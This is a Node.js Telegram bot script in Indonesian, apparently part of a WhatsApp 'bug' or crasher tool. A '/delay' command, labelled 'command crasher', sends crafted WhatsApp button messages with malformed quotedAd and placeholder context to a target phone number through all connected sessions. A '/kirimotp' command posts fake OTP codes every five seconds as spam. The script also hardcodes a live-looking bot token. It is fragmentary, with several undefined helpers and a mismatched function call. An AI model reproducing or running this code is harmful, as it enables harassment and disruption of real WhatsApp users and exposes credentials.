const TelegramBot = require('node-telegram-bot-api');

// Ganti token berikut dengan token bot kamu
const token = '8161837253:AAHcyGQdM81yb_WEz57fVyxCi7JlknWNl-Q';
const bot = new TelegramBot(token, { polling: true });

const fakeOTP = () => Math.floor(100000 + Math.random() * 900000).toString();

let spamInterval = {};

async function quoted(bot, peler, msg, buffer) {
  try {
    const buttons = [
      { buttonId: "yes", buttonText: { displayText: "✅ Ya" }, type: 1 },
      { buttonId: "no", buttonText: { displayText: "❌ Tidak" }, type: 1 }
    ];

    const buttonMessage = {
      text: "Coming",
      footer: "Vonzie Bot",
      buttons: buttons,
      headerType: 1,
      contextInfo: {
        mentionedJid: [peler],
        quotedAd: {
          advertiserName: " D ",
          caption: " D "
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: msg.key.id
        }
      }
    };

    await bot.sendMessage(peler, buttonMessage);
  } catch (err) {
    console.error("Gagal kirim pesan button quotedAd:", err);
  }
}

bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, `Selamat datang ${msg.from.first_name}!\n\nGunakan perintah:\n/kirimotp <nomor> untuk mengirim OTP terus menerus.`, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Mulai Kirim OTP", callback_data: "startotp" }],
        [{ text: "Stop Kirim OTP", callback_data: "stopotp" }]
      ]
    }
  });
});

bot.onText(/\/kirimotp (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const nomor = match[1];

  if (spamInterval[chatId]) {
    bot.sendMessage(chatId, `❌ Kirim OTP sedang berjalan!\nGunakan tombol *Stop Kirim OTP*.`, { parse_mode: "Markdown" });
    return;
  }

  bot.sendMessage(chatId, `✅ Mulai mengirim OTP ke *${nomor}*...`, { parse_mode: "Markdown" });

  spamInterval[chatId] = setInterval(() => {
    const otp = fakeOTP();

    bot.sendMessage(chatId, `📲 OTP untuk ${nomor}:\n\n*${otp}*`, {
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: `📋 Salin OTP`, callback_data: `copy_${otp}` }]
        ]
      }
    });

  }, 5000); // setiap 5 detik
});
bot.onText(/\/addbot(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;

  // Akses hanya untuk OWNER & SVIP
  if (!isOwner(msg.from.id) && !isSupervip(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "❗*LU SIAPA GOBLOK?!* Hanya OWNER & SVIP yang bisa tambah bot.",
      { parse_mode: "Markdown" }
    );
  }

  // Validasi input
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, "❗️Contoh penggunaan:\n`/addbot 62xxxxxxxxxx`", {
      parse_mode: "Markdown",
    });
  }

  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (botNumber.length < 10) {
    return bot.sendMessage(chatId, "❗️Nomor tidak valid.");
  }

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in /addbot:", error);
    bot.sendMessage(
      chatId,
      "⚠️ Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});
//command crasher
bot.onText(/\/delay(?:\s+(\d+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const COOLDOWN_TIME = settings.cooldown * 1000;
  const now = Date.now();

  try {
    if (!isPremium(userId) && !isSupervip(userId)) {
      return bot.sendMessage(chatId, "❌ Anda Tidak Memiliki Akses!", { parse_mode: "Markdown" });
    }

    const inputNumber = match[1];
    if (!inputNumber) {
      return bot.sendMessage(chatId, "❗️Example : /delay 62xxx", { parse_mode: "Markdown" });
    }

    const formattedNumber = inputNumber.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;

    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan /addbot terlebih dahulu.");
    }

    const lastUsage = cooldowns.get(userId);
    if (lastUsage && now - lastUsage < COOLDOWN_TIME) {
      const remainingTime = Math.ceil((COOLDOWN_TIME - (now - lastUsage)) / 1000);
      return bot.sendMessage(chatId, `⏱️ Tunggu ${remainingTime} detik sebelum menggunakan perintah ini lagi.`);
    }

    cooldowns.set(userId, now);
      //ganti link foto dibawah sesuai kebutuhan
    const statusMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/qp2uhp.png", {
      caption: `
\`\`\`

╭━━━⭓「 SENDING BUG 」
║ ◇ 𝐃𝐀𝐓𝐄 : ${dateTime()}
┃ ◇ 𝐒𝐄𝐍𝐃𝐄𝐑 : @${msg.from.username}
┃ ◇ 𝐌𝐄𝐓𝐇𝐎𝐃𝐒 : DELAY
║ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓𝐒 : ${formattedNumber}
╰━━━━━━━━━━━━━━━━━━⭓

\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { 
              text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
              url: `https://wa.me/${formattedNumber}` // Direct link to the target's WhatsApp
            },
          ],
        ],
      },
    });
    ;

    let successCount = 0;
    let failCount = 0;

    for (const [botNum, sock] of sessions.entries()) {
      try {
        await quoted(sock, jid);
        successCount++;
      } catch (err) {
        console.error(`Error in bot ${botNum}:`, err.message);
        failCount++;
      }
    }
  } catch (error) {
    console.error("DELAY ERROR:", error);
    await bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});

bot.on("callback_query", (callbackQuery) => {
  const msg = callbackQuery.message;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (data === "startotp") {
    bot.sendMessage(chatId, "Kirim perintah:\n`/kirimotp 08xxxx`", { parse_mode: "Markdown" });
  }

  if (data === "stopotp") {
    if (spamInterval[chatId]) {
      clearInterval(spamInterval[chatId]);
      delete spamInterval[chatId];
      bot.sendMessage(chatId, `✅ Kirim OTP telah dihentikan.`);
    } else {
      bot.sendMessage(chatId, `⚠️ Tidak ada pengiriman OTP yang berjalan.`);
    }
  }

  if (data.startsWith("copy_")) {
    const otp = data.split("copy_")[1];
    bot.answerCallbackQuery(callbackQuery.id, { text: `OTP "${otp}" telah disalin!`, show_alert: false });
  }
});
